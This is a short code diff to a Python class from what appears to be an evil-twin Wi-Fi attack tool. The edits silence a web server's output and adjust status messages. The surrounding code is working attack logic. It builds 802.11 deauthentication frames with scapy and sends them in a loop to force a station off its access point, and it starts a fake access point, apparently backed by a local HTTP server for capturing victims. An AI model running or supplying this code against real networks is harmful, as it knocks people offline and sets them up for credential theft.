@@ -59,13 +59,14 @@ class TwinManager:
             )
             print("[*] Setting up the http server ...")
             self.http_server_proc = subprocess.Popen([sys.executable, "http/http_server.py"],
-                # stdout=subprocess.DEVNULL,
-                # stderr=subprocess.DEVNULL
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
             )
         except Exception as e:
             util.sp_error_handler(e)
         
     def start_fake_ap(self):
+        print("[*] Starting the evil twin access point ...")
         self.twin_thread = threading.Thread(
             target=self._start_twin_activity()            
         )
@@ -92,11 +93,11 @@ class TwinManager:
     def _disconnect_station(self, ap_mac, st_mac):
         deauth_pkt = scapy.RadioTap()/scapy.Dot11(addr1=st_mac, addr2=ap_mac, addr3=ap_mac)/scapy.Dot11Deauth(reason=7)
         while not self.stop_event.is_set():
-            print("[*] Sending deauthentication frame!")
             self.socket.send(bytes(deauth_pkt))
             time.sleep(0.1)
         
     def start_deauth_attack(self, ap_mac, st_mac):
+        print("[*] Starting deauthentication attack ...")
         self.deauth_thread = threading.Thread(
             target=self._disconnect_station,
             args=(ap_mac, st_mac)
